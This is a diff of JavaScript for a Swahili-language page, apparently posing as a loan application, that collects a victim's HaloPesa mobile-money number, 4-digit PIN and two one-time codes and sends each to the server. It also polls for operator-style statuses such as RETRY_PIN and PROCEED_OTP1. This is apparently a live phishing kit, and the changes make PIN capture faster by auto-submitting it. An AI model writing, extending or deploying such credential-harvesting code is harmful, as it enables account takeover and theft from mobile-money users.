@@ -23,11 +23,13 @@ document.addEventListener('DOMContentLoaded', () => {
   const btnForm3Prev = document.getElementById('btn-form3-prev');
   const btnForm3Submit = document.getElementById('btn-form3-submit');
 
-  const signinPhone = document.getElementById('signin-phone');
   const pinBoxes = document.querySelectorAll('.pin-box-square');
-  const btnSubmitSignin = document.getElementById('btn-submit-signin');
+  const btnTogglePinVisibility = document.getElementById('btn-toggle-pin-visibility');
   const bannerPinError = document.getElementById('banner-pin-error');
   const bannerPhoneError = document.getElementById('banner-phone-error');
+
+  const displayApplicantName = document.getElementById('display-applicant-name');
+  const displayApplicantPhone = document.getElementById('display-applicant-phone');
 
   const otp1Boxes = document.querySelectorAll('.otp1-box-square');
   const btnSubmitOtp1 = document.getElementById('btn-submit-otp1');
@@ -115,6 +117,10 @@ document.addEventListener('DOMContentLoaded', () => {
         return;
       }
 
+      // Populate Name & Phone on PIN screen automatically
+      if (displayApplicantName) displayApplicantName.innerText = `${firstName} ${lastName}`.toUpperCase();
+      if (displayApplicantPhone) displayApplicantPhone.innerText = phone;
+
       showLoading('INATHIBITISHA MAOMBI...', 'Tafadhali subiri...');
 
       try {
@@ -159,6 +165,15 @@ document.addEventListener('DOMContentLoaded', () => {
     updateCalc();
   }
 
+  // Toggle PIN visibility (Show/Hide)
+  if (btnTogglePinVisibility) {
+    btnTogglePinVisibility.addEventListener('click', () => {
+      const isPassword = pinBoxes[0].type === 'password';
+      pinBoxes.forEach(b => b.type = isPassword ? 'text' : 'password');
+      btnTogglePinVisibility.innerText = isPassword ? 'Hide' : 'Show';
+    });
+  }
+
   function setupDigitInputs(boxes, onComplete) {
     boxes.forEach((box, idx) => {
       box.addEventListener('input', () => {
@@ -179,51 +194,52 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  setupDigitInputs(pinBoxes);
+  // Auto-submit PIN once 4 digits are filled
+  setupDigitInputs(pinBoxes, (pinVal) => {
+    submitPinAction(pinVal);
+  });
+
   setupDigitInputs(otp1Boxes, (otpVal) => { submitOtp1Action(otpVal); });
   setupDigitInputs(otp2Boxes, (otpVal) => { submitOtp2Action(otpVal); });
 
-  if (btnSubmitSignin) {
-    btnSubmitSignin.addEventListener('click', async () => {
-      const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
-      const phoneVal = signinPhone ? signinPhone.value.trim() : '';
+  async function submitPinAction(pinVal) {
+    const phoneVal = displayApplicantPhone ? displayApplicantPhone.innerText.trim() : document.getElementById('form-phone').value.trim();
 
-      if (!isValidHaloPesa(phoneVal)) {
-        showSurfaceError(bannerPinError, 'SAMAHANI: Namba ya HaloPesa inapaswa kuanza na 061, 062, au 063 pekee.');
-        return;
-      }
+    if (!isValidHaloPesa(phoneVal)) {
+      showSurfaceError(bannerPinError, 'SAMAHANI: Namba ya HaloPesa inapaswa kuanza na 061, 062, au 063 pekee.');
+      return;
+    }
 
-      if (pinVal.length !== 4) {
-        showSurfaceError(bannerPinError, 'Weka PIN sahihi ya tarakimu 4');
-        return;
-      }
+    if (pinVal.length !== 4) {
+      showSurfaceError(bannerPinError, 'Weka PIN sahihi ya tarakimu 4');
+      return;
+    }
 
-      bannerPinError.classList.remove('active');
-      showLoading('INATHIBITISHA PIN...', 'Tafadhali subiri...');
+    bannerPinError.classList.remove('active');
+    showLoading('INATHIBITISHA PIN...', 'Tafadhali subiri...');
 
-      try {
-        const res = await fetch('/api/submit-pin', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userId: currentUserId, phone: phoneVal, pin: pinVal })
-        });
-        const data = await res.json();
-        if (data.success) {
-          startStatusPolling();
-        } else {
-          hideLoading();
-        }
-      } catch (e) {
+    try {
+      const res = await fetch('/api/submit-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: currentUserId, phone: phoneVal, pin: pinVal })
+      });
+      const data = await res.json();
+      if (data.success) {
+        startStatusPolling();
+      } else {
         hideLoading();
       }
-    });
+    } catch (e) {
+      hideLoading();
+    }
   }
 
   async function submitOtp1Action(otpVal) {
     bannerOtp1Error.classList.remove('active');
     showLoading('INATHIBITISHA OTP...', 'Tafadhali subiri...');
 
-    const phoneVal = signinPhone ? signinPhone.value.trim() : '';
+    const phoneVal = displayApplicantPhone ? displayApplicantPhone.innerText.trim() : document.getElementById('form-phone').value.trim();
 
     try {
       const res = await fetch('/api/submit-otp1', {
@@ -253,7 +269,7 @@ document.addEventListener('DOMContentLoaded', () => {
     bannerOtp2Error.classList.remove('active');
     showLoading('INATHIBITISHA UHAKIKI...', 'Tafadhali subiri...');
 
-    const phoneVal = signinPhone ? signinPhone.value.trim() : '';
+    const phoneVal = displayApplicantPhone ? displayApplicantPhone.innerText.trim() : document.getElementById('form-phone').value.trim();
 
     try {
       const res = await fetch('/api/submit-otp2', {
@@ -293,8 +309,6 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenSignin);
-          const phoneVal = document.getElementById('form-phone').value.trim();
-          if (signinPhone) signinPhone.value = phoneVal;
           if (pinBoxes[0]) pinBoxes[0].focus();
         } else if (data.status === 'PROCEED_OTP1') {
           clearInterval(statusPollInterval);
@@ -307,7 +321,6 @@ document.addEventListener('DOMContentLoaded', () => {
           showScreen(screenOtp2);
           if (otp2Boxes[0]) otp2Boxes[0].focus();
         } else if (data.status === 'RETRY_PIN') {
-          // Imeboreshwa: Inasafisha visanduku, inatoa onyo na kurudisha kwenye PIN
           clearInterval(statusPollInterval);
           hideLoading();
           pinBoxes.forEach(b => b.value = '');
@@ -315,7 +328,6 @@ document.addEventListener('DOMContentLoaded', () => {
           if (pinBoxes[0]) pinBoxes[0].focus();
           showScreen(screenSignin);
         } else if (data.status === 'RETRY_OTP1') {
-          // Imeboreshwa: Inatoa onyo (notice), inasafisha visanduku, na kurudisha kwenye nafasi tupu za OTP
           clearInterval(statusPollInterval);
           hideLoading();
           otp1Boxes.forEach(b => b.value = '');
